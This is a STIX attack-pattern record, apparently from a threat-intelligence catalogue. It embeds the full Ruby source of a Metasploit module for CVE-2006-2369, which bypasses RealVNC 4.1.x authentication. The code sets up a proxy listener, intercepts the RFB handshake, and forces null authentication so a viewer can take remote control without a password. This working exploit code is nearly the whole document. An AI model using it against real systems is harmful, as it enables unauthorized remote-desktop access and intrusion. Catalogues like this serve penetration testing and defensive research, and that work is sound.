{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dbef374b-0114-47e3-8e98-5cccb7f66cfb",
    "created": "2024-08-14T16:22:48.184485Z",
    "modified": "2024-08-14T16:22:48.184489Z",
    "name": "RealVNC NULL Authentication Mode Bypass",
    "description": " This module exploits an Authentication bypass Vulnerability in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy listener on LPORT and proxies to the target server  The AUTOVNC option requires that vncviewer be installed on the attacking machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vnc/realvnc_41_bypass.rb",
            "external_id": "realvnc_41_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20080102163013/http://secunia.com/advisories/20107/"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2369"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealVNC NULL Authentication Mode Bypass',\n      'Description'    => %q{\n        This module exploits an Authentication bypass Vulnerability\n        in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy\n        listener on LPORT and proxies to the target server\n\n        The AUTOVNC option requires that vncviewer be installed on\n        the attacking machine.\n      },\n      'Author'         =>\n        [\n          'hdm', #original msf2 module\n          'theLightCosine'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['BID', '17978'],\n          ['OSVDB', '25479'],\n          ['URL', 'https://web.archive.org/web/20080102163013/http://secunia.com/advisories/20107/'],\n          ['CVE', '2006-2369'],\n        ],\n      'DisclosureDate' => '2006-05-15'))\n\n    register_options(\n      [\n        OptPort.new('RPORT',    [true, \"The port the target VNC Server is listening on\", 5900 ]),\n        OptPort.new('LPORT',    [true, \"The port the local VNC Proxy should listen on\", 5900 ]),\n        OptBool.new('AUTOVNC',  [true, \"Automatically launch vncviewer from this host\", false])\n      ])\n  end\n\n  def run\n    # starts up the Listener Server\n    print_status(\"Starting listener...\")\n    listener = Rex::Socket::TcpServer.create(\n      'LocalHost' => '0.0.0.0',\n      'LocalPort' => datastore['LPORT'],\n      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }\n    )\n\n    # If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine\n    # targetting the proxy listener.\n    if (datastore['AUTOVNC'])\n      unless (check_vncviewer())\n        print_error(\"The vncviewer does not appear to be installed, exiting...\")\n        return nil\n      end\n      print_status(\"Spawning viewer thread...\")\n      view = framework.threads.spawn(\"VncViewerWrapper\", false) {\n          system(\"vncviewer 127.0.0.1::#{datastore['LPORT']}\")\n      }\n    end\n\n    # Establishes the connection between the viewier and the remote server\n    client = listener.accept\n    add_socket(client)\n\n    # Closes the listener socket as it is no longer needed\n    listener.close\n\n    s = connect\n\n    serverhello = s.get_once\n    unless serverhello.include? \"RFB 003.008\"\n      print_error(\"The server is not vulnerable\")\n      return\n    end\n\n    # MitM attack on the VNC Authentication Process\n    client.puts(serverhello)\n    clienthello = client.get_once\n    s.puts(clienthello)\n\n    authmethods = s.read(2)\n\n    print_status(\"Auth methods received. Sending null authentication option to client\")\n    client.write(\"\\x01\\x01\")\n    client.read(1)\n    s.put(\"\\x01\")\n    s.read(4)\n    client.put(\"\\x00\\x00\\x00\\x00\")\n\n    # Handles remaining proxy operations between the two sockets\n    closed = false\n    while(closed == false)\n      sockets =[]\n      sockets << client\n      sockets << s\n      selected = select(sockets,nil,nil,0)\n      #print_status (\"Selected: #{selected.inspect}\")\n      unless selected.nil?\n\n        if selected[0].include?(client)\n          begin\n            data = client.get_once\n            if data.nil?\n              print_error(\"Client closed connection\")\n              closed = true\n            else\n              s.put(data)\n            end\n          rescue\n            print_error(\"Client closed connection\")\n            closed = true\n          end\n        end\n\n        if selected[0].include?(s)\n          begin\n            data = s.get_once\n            if data.nil?\n              print_error(\"Server closed connection\")\n              closed = true\n            else\n              client.put(data)\n            end\n          rescue\n            closed = true\n          end\n        end\n      end\n    end\n\n    # Close sockets\n    s.close\n    client.close\n\n    if (datastore['AUTOVNC'])\n      view.kill rescue nil\n    end\n  end\n\n  def check_vncviewer\n    vnc =\n      Rex::FileUtils::find_full_path('vncviewer') ||\n      Rex::FileUtils::find_full_path('vncviewer.exe')\n    if (vnc)\n      return true\n    else\n      return false\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-05-15"
}